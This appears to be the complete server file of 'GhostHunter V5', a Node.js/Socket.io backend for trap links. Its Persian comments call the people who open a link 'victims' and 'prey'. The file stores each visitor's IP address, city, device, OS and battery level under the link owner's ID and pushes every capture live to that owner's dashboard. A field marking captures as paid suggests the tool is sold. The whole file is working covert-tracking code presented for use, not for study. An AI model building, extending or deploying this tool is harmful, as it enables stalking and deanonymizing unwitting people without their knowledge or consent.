const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static(path.join(__dirname, 'public')));

// 💾 دیتابیس موقت (توی رم سرور)
// ساختار: { 'LinkID_123': [Victim1, Victim2], 'LinkID_456': [...] }
let trapDatabase = {};

io.on('connection', (socket) => {
    
    // 1. وقتی صاحب لینک وارد میشه (Login)
    socket.on('login-dashboard', (myLinkID) => {
        socket.join(myLinkID); // وارد اتاق مخصوص خودش میشه
        
        // اگه شکاری از قبل داشت، بهش نشون بده
        if (trapDatabase[myLinkID]) {
            socket.emit('load-history', trapDatabase[myLinkID]);
        }
    });

    // 2. وقتی قربانی به تله میفته
    socket.on('victim-data', (data) => {
        const linkID = data.linkID;
        
        const victimInfo = {
            id: Date.now(),
            ip: data.ip,
            city: data.city || 'Unknown',
            device: data.device,
            os: data.os,
            battery: data.battery + '%',
            time: new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' }),
            date: new Date().toLocaleDateString(),
            isPaid: false
        };

        // ذخیره در حافظه سرور
        if (!trapDatabase[linkID]) {
            trapDatabase[linkID] = [];
        }
        trapDatabase[linkID].unshift(victimInfo); // اضافه به اول لیست
        
        // نگه داشتن فقط ۵۰ تا شکار آخر برای هر لینک (که سرور منفجر نشه)
        if (trapDatabase[linkID].length > 50) trapDatabase[linkID].pop();

        // ارسال زنده به صاحب لینک (اگه آنلاین باشه)
        io.to(linkID).emit('new-capture', victimInfo);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`GhostHunter V5 running on port ${PORT}`));
